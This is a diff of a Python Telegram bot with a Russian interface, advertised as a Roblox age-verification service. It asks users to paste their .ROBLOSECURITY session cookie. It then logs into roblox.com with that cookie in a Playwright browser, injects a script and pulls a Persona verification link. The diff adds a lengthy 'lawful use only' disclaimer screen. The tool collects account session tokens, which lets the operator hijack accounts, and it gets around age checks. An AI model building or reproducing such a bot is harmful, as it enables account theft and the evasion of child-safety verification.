@@ -1,3 +1,4 @@
+import os
 import requests
 import logging
 import re
@@ -8,12 +9,12 @@ from telegram.ext import (ApplicationBuilder, CommandHandler, MessageHandler,
                           CallbackQueryHandler, filters, ContextTypes, ConversationHandler)
 
 logging.basicConfig(level=logging.INFO)
-import os
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
 WAITING_COOKIE, WAITING_CHOICE = range(2)
-
-# Увеличиваем до 20 потоков
 executor = ThreadPoolExecutor(max_workers=20)
+
+# Храним пользователей которые уже приняли правила
+accepted_users = set()
 
 INJECT_SCRIPT = """
 (function() {
@@ -120,10 +121,8 @@ def playwright_get_url(cookie: str, method: str):
                 "domain": ".roblox.com",
                 "path": "/"
             }])
-
             page = context.new_page()
             page.add_init_script(INJECT_SCRIPT)
-
             page.goto(
                 "https://www.roblox.com/my/account#!/info",
                 wait_until="networkidle",
@@ -154,9 +153,7 @@ def playwright_get_url(cookie: str, method: str):
                     """)
                 except:
                     clicked = False
-
                 if clicked:
-                    logging.info(f"✅ Клик #{attempt+1}")
                     break
                 page.wait_for_timeout(2000)
 
@@ -172,11 +169,9 @@ def playwright_get_url(cookie: str, method: str):
                     if raw:
                         result_url = build_url(raw)
                         if result_url:
-                            logging.info(f"✅ Ссылка за {i+1} сек: {result_url}")
                             break
                 except:
                     pass
-                logging.info(f"Жду... {i+1}/25")
 
             browser.close()
             return result_url
@@ -185,40 +180,110 @@ def playwright_get_url(cookie: str, method: str):
         logging.error(f"Ошибка: {e}")
         return f"ERROR: {e}"
 
-import asyncio
+
+# ===== TELEGRAM =====
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+
+    # Если уже принял правила — показываем главное меню
+    if user_id in accepted_users:
+        await show_main_menu(update, context)
+        return WAITING_CHOICE
+
+    # Первый раз — показываем правила
+    keyboard = InlineKeyboardMarkup([
+        [InlineKeyboardButton("✅ Принять и продолжить", callback_data="accept_rules")]
+    ])
+
+    await update.message.reply_text(
+        "👋 *Добро пожаловать!*\n\n"
+        "Этот бот помогает получать и проверять ссылки для официальной верификации аккаунтов Roblox.\n\n"
+        "⚠️ *Важно:*\n"
+        "• Бот не запрашивает ваш пароль от аккаунта Roblox.\n"
+        "• Используйте только официальные кук сессии Roblox.\n"
+        "• Администрация бота не имеет отношения к Roblox Corporation.\n\n"
+        "📋 *Политика использования*\n\n"
+        "1. Пользователь самостоятельно принимает решение об использовании бота.\n"
+        "2. Администрация бота не несёт ответственности за действия пользователей на сторонних сайтах.\n"
+        "3. Администрация бота не несёт ответственности за кук файлы.\n"
+        "4. Бот предназначен исключительно для законных целей и не создан для нарушения правил Roblox, законодательства Российской Федерации или законодательства других государств.\n"
+        "5. Администрация бота заявляет, что функционал бота не направлен на нарушение законодательства Российской Федерации, а также не содержит призывов к совершению противоправных действий.\n"
+        "6. Пользователь самостоятельно несёт ответственность за свои действия при использовании бота и обязан соблюдать действующее законодательство.\n\n"
+        "📌 *Соглашение*\n\n"
+        "Нажимая кнопку «✅ Принять и продолжить», вы подтверждаете, что ознакомились с правилами, "
+        "принимаете условия использования сервиса и обязуетесь использовать бота только в законных целях.\n\n"
+        "Для продолжения работы нажмите кнопку ниже:",
+        parse_mode="Markdown",
+        reply_markup=keyboard
+    )
+    return WAITING_CHOICE
+
+
+async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = InlineKeyboardMarkup([
         [InlineKeyboardButton("📷 Лицо (Camera)", callback_data="choose_camera")],
         [InlineKeyboardButton("🪪 Паспорт (ID)", callback_data="choose_id")],
     ])
-    await update.message.reply_text(
+
+    text = (
         "👋 *Roblox Age Verification Bot*\n\n"
         "Сервис для получения ссылки by @dedbed12\n\n"
         "🔢 Ваши попытки: *999*\n\n"
-        "Выберите действие ниже:",
-        parse_mode="Markdown",
-        reply_markup=keyboard
+        "Выберите действие ниже:"
     )
-    return WAITING_COOKIE
 
-async def choose_method(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.callback_query:
+        await update.callback_query.edit_message_text(
+            text,
+            parse_mode="Markdown",
+            reply_markup=keyboard
+        )
+    else:
+        await update.message.reply_text(
+            text,
+            parse_mode="Markdown",
+            reply_markup=keyboard
+        )
+
+
+async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
-    method = "camera" if query.data == "choose_camera" else "id"
-    method_name = "📷 Лицо (Camera)" if method == "camera" else "🪪 Паспорт (ID)"
-    context.user_data["method"] = method
-    await query.edit_message_text(
-        f"✅ Выбран метод: *{method_name}*\n\n"
-        f"Теперь отправь свой `.ROBLOSECURITY` cookie\n\n"
-        f"⚠️ Сообщение с cookie будет удалено автоматически",
-        parse_mode="Markdown"
-    )
-    return WAITING_COOKIE
+    user_id = update.effective_user.id
+
+    # Принятие правил
+    if query.data == "accept_rules":
+        accepted_users.add(user_id)
+        await show_main_menu(update, context)
+        return WAITING_CHOICE
+
+    # Выбор метода
+    if query.data in ["choose_camera", "choose_id"]:
+        method = "camera" if query.data == "choose_camera" else "id"
+        method_name = "📷 Лицо (Camera)" if method == "camera" else "🪪 Паспорт (ID)"
+        context.user_data["method"] = method
+
+        await query.edit_message_text(
+            f"✅ Выбран метод: *{method_name}*\n\n"
+            f"Теперь отправь свой `.ROBLOSECURITY` cookie\n\n"
+            f"⚠️ Сообщение с cookie будет удалено автоматически",
+            parse_mode="Markdown"
+        )
+        return WAITING_COOKIE
+
+    return WAITING_CHOICE
+
 
 async def receive_cookie(update: Update, context: ContextTypes.DEFAULT_TYPE):
     cookie = update.message.text.strip()
     method = context.user_data.get("method")
+    user_id = update.effective_user.id
+
+    # Если не принял правила
+    if user_id not in accepted_users:
+        await update.message.reply_text("❌ Сначала прими правила! /start")
+        return ConversationHandler.END
 
     if not method:
         await update.message.reply_text("❌ Сначала выбери метод! /start")
@@ -249,19 +314,14 @@ async def receive_cookie(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode="Markdown"
     )
 
+    import asyncio
     loop = asyncio.get_event_loop()
-    result = await loop.run_in_executor(
-        executor, playwright_get_url, cookie, method
-    )
+    result = await loop.run_in_executor(executor, playwright_get_url, cookie, method)
 
     if isinstance(result, str) and result.startswith("ERROR"):
-        await msg.edit_text(
-            "❌ Ошибка браузера\n\n/start чтобы попробовать снова"
-        )
+        await msg.edit_text("❌ Ошибка браузера\n\n/start чтобы попробовать снова")
     elif result == "NOT_CLICKED":
-        await msg.edit_text(
-            "❌ Кнопка не найдена\n\n/start чтобы попробовать снова"
-        )
+        await msg.edit_text("❌ Кнопка не найдена\n\n/start чтобы попробовать снова")
     elif result and "withpersona.com" in result:
         await msg.edit_text(
             "✅ *Ссылка получена!*\n\n"
@@ -275,19 +335,39 @@ async def receive_cookie(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "/start чтобы попробовать снова"
         )
 
-    return ConversationHandler.END
+    # После получения — показываем меню снова
+    keyboard = InlineKeyboardMarkup([
+        [InlineKeyboardButton("📷 Лицо (Camera)", callback_data="choose_camera")],
+        [InlineKeyboardButton("🪪 Паспорт (ID)", callback_data="choose_id")],
+    ])
+    await update.message.reply_text(
+        "👋 *Roblox Age Verification Bot*\n\n"
+        "Сервис для получения ссылки by @dedbed12\n\n"
+        "🔢 Ваши попытки: *999*\n\n"
+        "Выберите действие ниже:",
+        parse_mode="Markdown",
+        reply_markup=keyboard
+    )
+
+    return WAITING_CHOICE
+
 
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("❌ Отменено. /start чтобы начать")
     return ConversationHandler.END
 
+
 def main():
+    import asyncio
     app = ApplicationBuilder().token(BOT_TOKEN).build()
     conv = ConversationHandler(
         entry_points=[CommandHandler("start", start)],
         states={
+            WAITING_CHOICE: [
+                CallbackQueryHandler(handle_callback),
+            ],
             WAITING_COOKIE: [
-                CallbackQueryHandler(choose_method, pattern="^choose_"),
+                CallbackQueryHandler(handle_callback),
                 MessageHandler(filters.TEXT & ~filters.COMMAND, receive_cookie),
             ],
         },
@@ -299,6 +379,7 @@ def main():
     app.add_handler(conv)
     print("🤖 Бот запущен!")
     app.run_polling(allowed_updates=Update.ALL_TYPES)
+
 
 if __name__ == "__main__":
     main()
